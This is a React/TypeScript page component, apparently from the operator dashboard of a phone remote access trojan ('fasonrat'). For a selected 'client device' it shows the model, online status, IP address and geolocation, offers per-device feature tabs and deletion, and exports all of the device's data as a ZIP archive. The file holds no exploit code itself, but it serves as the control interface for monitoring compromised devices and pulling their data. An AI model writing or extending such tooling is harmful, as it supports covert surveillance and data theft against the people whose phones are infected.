import { useEffect, useState, useCallback, useRef } from 'react';
import { useParams, useNavigate, NavLink, Outlet } from 'react-router-dom';
import { clientsApi } from '@/services/api';
import type { ClientDevice, DeviceOutletContext } from '@/types';
import { useAuthStore } from '@/store/auth';
import { useDevicesStore } from '@/store/devices';
import { getDeviceTabs } from '@/config/navigation';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Smartphone, RefreshCw, Trash2, AlertCircle, Download, Loader2 } from 'lucide-react';
import { cn, getCountryFlag } from '@/lib/utils';

export default function DevicePage() {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const desktopTabBarRef = useRef<HTMLDivElement>(null);
  const { hasPermission } = useAuthStore();
  const deleteDeviceFromStore = useDevicesStore((s) => s.deleteDevice);
  const deviceTabs = getDeviceTabs(hasPermission);
  const [client, setClient] = useState<ClientDevice | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (loading || !client) return;
    const el = desktopTabBarRef.current;
    if (!el) return;
    const onWheel = (e: WheelEvent) => {
      if (e.deltaY === 0) return;
      e.preventDefault();
      el.scrollLeft += e.deltaY;
    };
    el.addEventListener('wheel', onWheel, { passive: false });
    return () => el.removeEventListener('wheel', onWheel);
  }, [id, loading, client]);

  const loadClient = useCallback(async () => {
    if (!id) return;
    setLoading(true);
    setError(null);
    try {
      const res = await clientsApi.getOne(id);
      if (res.data.success) {
        setClient(res.data.data);
      } else {
        setError('Device not found');
      }
    } catch {
      setError('Failed to load device. It may not exist or server is unreachable.');
    }
    setLoading(false);
  }, [id]);

  useEffect(() => {
    loadClient();
  }, [loadClient]);

  const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);
  const [exporting, setExporting] = useState(false);
  const [actionError, setActionError] = useState<string | null>(null);

  const handleExport = async () => {
    if (!id) return;
    setExporting(true);
    setActionError(null);
    try {
      const { fetchAuthBlob } = await import('@/services/api');
      const blob = await fetchAuthBlob(`/api/client/${id}/export`);
      if (!blob) throw new Error('Export failed');
      const url = window.URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.download = `fasonrat-data-${id}.zip`;
      document.body.appendChild(link);
      link.click();
      link.remove();
      setTimeout(() => window.URL.revokeObjectURL(url), 1000);
    } catch (err: any) {
      setActionError(err?.message || 'Failed to export device data');
    } finally {
      setExporting(false);
    }
  };

  const handleDelete = async () => {
    if (!id) return;
    setActionError(null);
    try {
      const ok = await deleteDeviceFromStore(id);
      if (ok) {
        navigate('/devices');
      } else {
        setActionError('Delete failed. Device may already be removed.');
      }
    } catch (err: any) {
      setActionError(err?.message || 'Failed to delete device');
    }
    setShowDeleteConfirm(false);
  };

  if (loading && !client) {
    return (
      <div className="flex items-center justify-center py-20">
        <RefreshCw className="h-6 w-6 animate-spin text-primary" />
      </div>
    );
  }

  if (error && !client) {
    return (
      <div className="flex items-center justify-center py-20">
        <div className="text-center space-y-4 max-w-md">
          <AlertCircle className="h-12 w-12 mx-auto text-destructive" />
          <h3 className="text-lg font-semibold">Device Not Found</h3>
          <p className="text-sm text-muted-foreground">{error}</p>
          <div className="flex gap-2 justify-center">
            <Button onClick={loadClient} variant="outline">
              <RefreshCw className="h-4 w-4 mr-2" /> Retry
            </Button>
            <Button onClick={() => navigate('/devices')} variant="outline">
              ← Back
            </Button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-4 -m-4 md:-m-6 lg:-m-8">
      <div className="bg-card border-b">
        <div className="px-4 md:px-6 py-3">
          <div className="flex items-center gap-3">
            <Button variant="ghost" size="icon" onClick={() => navigate('/devices')} className="shrink-0 h-8 w-8 text-muted-foreground hover:text-foreground -ml-2">
              ←
            </Button>
            <div className="h-9 w-9 rounded-lg bg-primary/10 flex items-center justify-center shrink-0">
              <Smartphone className="h-5 w-5 text-primary" />
            </div>
            <div className="flex-1 min-w-0">
              <div className="flex items-center gap-2">
                <h2 className="text-base font-semibold truncate">{client?.deviceModel || 'Unknown Device'}</h2>
                {client?.online ? (
                  <Badge className="bg-success/15 text-success border-success/25 text-[10px] px-1.5 py-0">Online</Badge>
                ) : (
                  <Badge variant="secondary" className="text-[10px] px-1.5 py-0">Offline</Badge>
                )}
              </div>
              <div className="flex items-center gap-2 text-xs text-muted-foreground mt-0.5">
                <span className="font-mono truncate max-w-[100px]" title={id}>{id?.substring(0, 10)}...</span>
                <span>·</span>
                <span>{getCountryFlag(client?.country ?? null)} {client?.city || client?.country || client?.ip || 'Unknown'}</span>
                {client?.online && (
                  <>
                    <span className="hidden sm:inline">·</span>
                    <span className="hidden sm:inline">{client.ip}</span>
                  </>
                )}
              </div>
            </div>
            <div className="flex items-center gap-1 shrink-0">
              <Button variant="ghost" size="icon" onClick={loadClient} disabled={loading} className="h-8 w-8" aria-label="Refresh device">
                <RefreshCw className={`h-3.5 w-3.5 ${loading ? 'animate-spin' : ''}`} />
              </Button>
              {hasPermission('files:download') && hasPermission('device:view') && (
                <Button variant="ghost" size="icon" onClick={handleExport} disabled={exporting} className="h-8 w-8 text-muted-foreground hover:text-primary" aria-label="Download all data" title="Download all data as ZIP">
                  {exporting ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <Download className="h-3.5 w-3.5" />}
                </Button>
              )}
              {hasPermission('device:delete') && !showDeleteConfirm && (
                <Button variant="ghost" size="icon" onClick={() => setShowDeleteConfirm(true)} className="h-8 w-8 text-muted-foreground hover:text-destructive" aria-label="Delete device">
                  <Trash2 className="h-3.5 w-3.5" />
                </Button>
              )}
              {showDeleteConfirm && (
                <div className="flex items-center gap-1">
                  <Button variant="destructive" size="sm" onClick={handleDelete} className="h-7 text-xs px-2">
                    Confirm
                  </Button>
                  <Button variant="outline" size="sm" onClick={() => setShowDeleteConfirm(false)} className="h-7 text-xs px-2">
                    Cancel
                  </Button>
                </div>
              )}
            </div>
          </div>
        </div>

        <div className="border-t">
          <div className="hidden md:block">
            <div ref={desktopTabBarRef} className="flex items-center overflow-x-auto px-2 gap-0.5">
              {deviceTabs.map((tab) => (
                <NavLink
                  key={tab.to}
                  to={`/device/${id}/${tab.to}`}
                  className={({ isActive }) =>
                    cn(
                      'flex items-center gap-1.5 px-3 py-2 text-xs font-medium transition-colors whitespace-nowrap border-b-2',
                      isActive
                        ? 'border-primary text-primary'
                        : 'border-transparent text-muted-foreground hover:text-foreground hover:border-muted-foreground/30'
                    )
                  }
                >
                  <tab.icon className="h-3.5 w-3.5 shrink-0" />
                  {tab.label}
                </NavLink>
              ))}
            </div>
          </div>

          <div className="md:hidden">
            <div className="flex items-center overflow-x-auto px-3 py-1.5 gap-1 scrollbar-none">
              {deviceTabs.map((tab) => (
                <NavLink
                  key={tab.to}
                  to={`/device/${id}/${tab.to}`}
                  className={({ isActive }) =>
                    cn(
                      'flex items-center gap-1.5 px-2.5 py-1.5 text-xs font-medium rounded-full transition-colors whitespace-nowrap',
                      isActive
                        ? 'bg-primary text-primary-foreground'
                        : 'text-muted-foreground hover:bg-muted'
                    )
                  }
                >
                  <tab.icon className="h-3 w-3 shrink-0" />
                  {tab.label}
                </NavLink>
              ))}
            </div>
          </div>
        </div>
      </div>

      {!client?.online && (
        <div className="mx-4 md:mx-6 lg:mx-8 mt-2 p-2.5 rounded-lg bg-warning/10 border border-warning/20 text-warning text-xs flex items-center gap-2">
          <AlertCircle className="h-3.5 w-3.5 shrink-0" />
          <span className="font-medium">Device Offline</span>
          <span className="text-warning/70">Some features are unavailable while offline.</span>
        </div>
      )}
      {actionError && (
        <div className="mx-4 md:mx-6 lg:mx-8 mt-2 p-3 rounded-lg bg-destructive/10 border border-destructive/20 text-destructive text-sm flex items-center gap-2">
          <AlertCircle className="h-4 w-4 shrink-0" /> {actionError}
          <button onClick={() => setActionError(null)} className="ml-auto text-xs hover:text-destructive/80">Dismiss</button>
        </div>
      )}
      <div className="p-4 md:p-6 lg:p-8 pt-2 md:pt-4 lg:pt-6">
        <Outlet context={{ client, clientId: id ?? '', loadClient, online: !!client?.online } satisfies DeviceOutletContext} />
      </div>
    </div>
  );
}
